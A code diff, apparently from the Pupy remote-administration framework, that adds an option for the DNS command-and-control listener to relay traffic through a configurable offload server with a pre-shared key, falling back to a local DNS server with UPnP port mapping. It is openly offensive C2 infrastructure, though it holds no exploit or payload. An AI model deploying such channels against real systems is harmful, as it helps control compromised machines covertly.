@@ -8,6 +8,8 @@ from Queue import Queue
 from pupylib.PupyConfig import PupyConfig
 from pupylib.utils.network import get_listener_ip_with_local, get_listener_port
 
+from pupylib.PupyOffload import PupyOffloadManager
+
 import requests
 import netifaces
 import socket
@@ -181,15 +183,26 @@ class PupyDnsCnc(object):
             config=self.config
         )
 
-        self.server = DnsCommandServer(
-            self.handler,
-            address=listen,
-            port=int(port)
-        )
+        offload_server = config.get('pupyd', 'offload_server')
+        offload_psk = config.get('pupyd', 'offload_psk')
 
-        if self.igd and self.igd.available:
-            self.igd.AddPortMapping(53, 'UDP', int(port))
-            self.igd.AddPortMapping(53, 'TCP', int(port))
+        if offload_server and offload_psk:
+            try:
+                manager = PupyOffloadManager(offload_server, offload_psk)
+                self.server = manager.dns(self.handler, domain)
+            except Exception, e:
+                logging.exception(e)
+
+        else:
+            self.server = DnsCommandServer(
+                self.handler,
+                address=listen,
+                port=int(port)
+            )
+
+            if self.igd and self.igd.available:
+                self.igd.AddPortMapping(53, 'UDP', int(port))
+                self.igd.AddPortMapping(53, 'TCP', int(port))
 
         self.server.start()
 
